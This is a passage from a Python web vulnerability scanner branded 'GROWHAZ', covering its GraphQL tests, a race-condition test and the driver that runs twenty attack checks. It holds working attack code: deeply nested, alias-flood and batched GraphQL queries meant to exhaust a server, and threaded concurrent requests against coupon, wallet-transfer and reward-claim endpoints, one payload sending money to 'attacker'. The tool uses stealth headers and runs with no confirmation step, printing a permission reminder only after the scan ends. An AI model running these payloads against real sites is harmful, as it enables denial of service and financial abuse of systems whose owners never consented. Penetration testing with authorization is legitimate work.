        graphql_endpoints = []
        for url in self.discovered_endpoints:
            if any(pattern in url.lower() for pattern in ['graphql', 'gql', 'query']):
                graphql_endpoints.append(url)

        if not graphql_endpoints:
            graphql_endpoints = [
                f"{self.base_url}/graphql",
                f"{self.base_url}/api/graphql",
                f"{self.base_url}/gql",
                f"{self.base_url}/query",
                f"{self.base_url}/api/query"
            ]

        introspection_query = """
        {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                  kind
                }
              }
            }
          }
        }
        """

        field_suggestion_query = """
        {
          __typo
        }
        """

        deep_query = """
        query {
          user {
            posts {
              comments {
                author {
                  posts {
                    comments {
                      author {
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """

        alias_query = "query {\n"
        for i in range(100):
            alias_query += f"  a{i}: user {{ id }}\n"
        alias_query += "}"

        batch_queries = []
        for i in range(50):
            batch_queries.append(f"q{i}: user(id: {i}) {{ id name email }}")
        batched_query = "{" + " ".join(batch_queries) + "}"

        tests = [
            ("Introspection", introspection_query, True),
            ("Field Suggestions", field_suggestion_query, False),
            ("Deep Query DoS", deep_query, False),
            ("Alias DoS", alias_query, False),
            ("Batched Query", batched_query, False)
        ]

        for endpoint in graphql_endpoints:
            self.log(f"  Testing GraphQL at {endpoint}")

            for test_name, query, should_succeed in tests:
                try:
                    payload = {'query': query}
                    resp = self._request('POST', endpoint, json=payload, timeout=10)

                    if self.is_blocked(resp):
                        continue

                    content = resp.text

                    if test_name == "Introspection" and '__schema' in content:
                        self.log(f"  ⚠️ GraphQL introspection enabled at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="GraphQL Introspection",
                            endpoint=endpoint,
                            payload="Introspection Query",
                            request=resp._request_info,
                            response=resp,
                            extra={'note': 'GraphQL introspection exposes schema details'}
                        )
                        details.append(f"GraphQL introspection enabled")

                    elif test_name == "Field Suggestions" and 'Did you mean' in content:
                        self.log(f"  ⚠️ GraphQL field suggestions enabled at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="GraphQL Information Disclosure",
                            endpoint=endpoint,
                            payload="Field Suggestion Query",
                            response=resp
                        )
                        details.append(f"GraphQL field suggestions enabled")

                    elif test_name in ["Deep Query DoS", "Alias DoS", "Batched Query"]:
                        response_time = resp.elapsed.total_seconds()
                        if response_time > 5:
                            self.log(f"  ⚠️ Possible DoS vulnerability via {test_name} at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="GraphQL DoS Vulnerability",
                                endpoint=endpoint,
                                payload=f"{test_name} Query",
                                response={'response_time': response_time}
                            )
                            details.append(f"GraphQL DoS via {test_name}")

                except requests.exceptions.Timeout:
                    if test_name in ["Deep Query DoS", "Alias DoS", "Batched Query"]:
                        self.log(f"  ⚠️ Timeout - possible DoS via {test_name} at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="GraphQL DoS Vulnerability",
                            endpoint=endpoint,
                            payload=f"{test_name} Query",
                            response={'error': 'timeout'}
                        )
                        details.append(f"GraphQL DoS via {test_name} caused timeout")
                except Exception as e:
                    continue

        self.test_summary["GraphQL Security"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "GraphQL seems properly secured"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: Race Conditions (enhanced)
    # ----------------------------------------------------------------------
    def test_race_conditions(self):
        """Test for Race Condition vulnerabilities with concurrent requests"""
        self.log("🔍 Testing Race Conditions...")
        vulnerable = False
        details = []

        race_patterns = ['/coupon', '/redeem', '/transfer', '/withdraw', 
                        '/deposit', '/order', '/checkout', '/vote', '/like',
                        '/limit', '/send', '/claim', '/bonus', '/balance']

        race_endpoints = []
        for url in self.discovered_endpoints:
            if any(pattern in url.lower() for pattern in race_patterns):
                race_endpoints.append(url)

        if not race_endpoints:
            race_endpoints = [
                f"{self.base_url}/api/coupon/redeem",
                f"{self.base_url}/api/wallet/transfer",
                f"{self.base_url}/api/order/create",
                f"{self.base_url}/api/vote",
                f"{self.base_url}/api/like",
                f"{self.base_url}/api/balance/claim",
                f"{self.base_url}/api/rewards/claim"
            ]

        def send_request(endpoint, request_id, data, results):
            try:
                headers = get_stealth_headers()
                if self.auth_token:
                    headers['Authorization'] = f'Bearer {self.auth_token}'
                
                start_time = time.time()
                resp = requests.post(endpoint, json=data, headers=headers, timeout=5)
                elapsed = time.time() - start_time
                
                results[request_id] = {
                    'status': resp.status_code,
                    'time': elapsed,
                    'content': resp.text[:200]
                }
            except Exception as e:
                results[request_id] = {'error': str(e)}

        for endpoint in race_endpoints:
            self.log(f"  Testing race conditions at {endpoint}")

            test_data = {}
            if 'coupon' in endpoint or 'redeem' in endpoint:
                test_data = {'code': 'RACE2024', 'user_id': self.user_id or '1'}
            elif 'transfer' in endpoint:
                test_data = {'amount': 100, 'to_account': 'attacker', 'from_account': self.user_id or '1'}
            elif 'vote' in endpoint or 'like' in endpoint:
                test_data = {'item_id': 1, 'vote': 1, 'user_id': self.user_id or '1'}
            elif 'claim' in endpoint:
                test_data = {'reward_id': 1, 'user_id': self.user_id or '1'}
            else:
                test_data = {'id': 1, 'quantity': 1, 'user_id': self.user_id or '1'}

            results = {}
            threads = []
            request_count = self.concurrent_requests

            for i in range(request_count):
                thread = threading.Thread(
                    target=send_request,
                    args=(endpoint, i, test_data.copy(), results)
                )
                threads.append(thread)

            start_time = time.time()
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            total_time = time.time() - start_time

            success_count = sum(1 for r in results.values() 
                              if r and r.get('status') == 200)
            error_count = sum(1 for r in results.values() 
                            if r and r.get('status', 0) >= 400)

            if success_count > 1 and any(x in endpoint.lower() for x in ['coupon', 'claim', 'redeem']):
                self.log(f"  ⚠️ Possible race condition at {endpoint}", "WARNING")
                vulnerable = True
                self.add_vulnerability(
                    vuln_type="Race Condition",
                    endpoint=endpoint,
                    payload=f"{request_count} concurrent requests",
                    parameter="Resource redemption",
                    response={
                        'success_count': success_count,
                        'error_count': error_count,
                        'total_time': total_time,
                        'details': f"{success_count} out of {request_count} requests succeeded"
                    }
                )
                details.append(f"Race condition at {endpoint}")

        self.test_summary["Race Conditions"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No race conditions detected"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Main orchestration with all tests
    # ----------------------------------------------------------------------
    def run_all_tests(self):
        """Run all security tests"""
        self.log("=" * 60)
        self.log(f"🚀 Starting security tests for {self.base_url}")
        self.log("=" * 60)

        self.discover_endpoints()
        self.attempt_login()

        tests = [
            ("SQL Injection", self.test_sql_injection),
            ("Cross-Site Scripting (XSS)", self.test_xss),
            ("Authentication Flaws", self.test_authentication_flaws),
            ("IDOR", self.test_insecure_direct_object_reference),
            ("CORS Misconfiguration", self.test_cors_misconfiguration),
            ("Sensitive Data Exposure", self.test_sensitive_data_exposure),
            ("Security Headers", self.test_security_headers),
            ("SSL/TLS Vulnerabilities", self.test_ssl_tls_vulnerabilities),
            ("CSRF", self.test_csrf),
            ("Open Redirect", self.test_open_redirect),
            ("Directory Traversal", self.test_directory_traversal),
            ("SSRF", self.test_ssrf),
            ("Command Injection", self.test_command_injection),
            ("File Upload", self.test_file_upload),
            ("Rate Limiting Bypass", self.test_rate_limiting_bypass),
            ("JWT Attacks", self.test_jwt_attacks),
            ("Prototype Pollution", self.test_prototype_pollution),
            ("Business Logic Flaws", self.test_business_logic_flaws),
            ("GraphQL Security", self.test_graphql_security),
            ("Race Conditions", self.test_race_conditions),
        ]

        for test_name, test_func in tests:
            self.log(f"\n{'='*40}")
            self.log(f"Running {test_name} test...")
            self.log(f"{'='*40}")
            
            try:
                test_func()
            except Exception as e:
                self.log(f"❌ Error during {test_name}: {e}", "ERROR")
                self.test_summary[test_name] = {"status": "ERROR", "details": str(e)}

        self.log("\n" + "=" * 60)
        self.log("📊 SECURITY TEST SUMMARY")
        self.log("=" * 60)

        for test_name, info in self.test_summary.items():
            status = info.get('status', 'UNKNOWN')
            details = info.get('details', '')
            emoji = "❌" if status == "VULNERABLE" else "✅" if status == "SECURE" else "🚧" if status == "BLOCKED" else "⚠️" if status == "ERROR" else "⏭️"
            self.log(f"{emoji} {test_name}: {status} – {details}")

        self.save_report()
        return 0

def main():
    print(r"""
    ╔══════════════════════════════════════════════════════════════╗
    ║     GROWHAZ Professional Security Testing Tool v5.0          ║
    ║     Deep Scan | Stealth Mode | CVSS | OWASP | Threaded      ║
    ║     NEW: SSRF | Command Injection | File Upload | JWT       ║
    ║     NEW: Rate Limiting | Prototype Pollution | GraphQL      ║
    ║     NEW: Business Logic | Race Conditions                   ║
    ║     Enhanced Crawling for React/Next.js/Angular             ║
    ║     Simple Input: URL + Report ID + Login Credentials       ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

    import argparse
    parser = argparse.ArgumentParser(description='Professional security testing tool for web applications.')
    parser.add_argument('base_url', help='Base URL of the target (e.g., https://example.com)')
    parser.add_argument('--report-id', help='Supabase report ID to update')
    parser.add_argument('--login', help='Login credential (email or phone number)')
    parser.add_argument('--password', help='Password for login')
    
    args = parser.parse_args()

    base_url = args.base_url
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'https://' + base_url

    report_id = args.report_id or os.getenv('REPORT_ID')
    
    print(f"\n📋 Configuration:")
    print(f"  • Target URL: {base_url}")
    print(f"  • Report ID: {report_id or 'Not provided'}")
    print(f"  • Login Credential: {args.login or 'Not provided'}")
    print(f"  • Password: {'[PROVIDED]' if args.password else 'Not provided'}")
    print(f"  • Supabase URL: {'Configured' if os.getenv('SUPABASE_URL') else 'Not configured'}")

    if not report_id:
        print("\n⚠️  WARNING: No report ID provided. Results will be saved locally but not to Supabase.")

    print("\n🚀 Running in automated mode (no confirmation needed)")
    print("=" * 60)
    
    tester = SecurityTester(
        base_url, 
        report_id=report_id,
        login_credential=args.login,
        login_password=args.password
    )
    
    exit_code = tester.run_all_tests()

    print("\n" + "=" * 60)
    print("📝 IMPORTANT NOTES:")
    print("  • This tool only tests for COMMON vulnerabilities")
    print("  • Manual testing is still required for comprehensive assessment")
    print("  • Always test in a STAGING environment first")
    print("  • Never test production systems without permission")
    print("=" * 60)
    
    sys.exit(exit_code)

if __name__ == "__main__":
    main()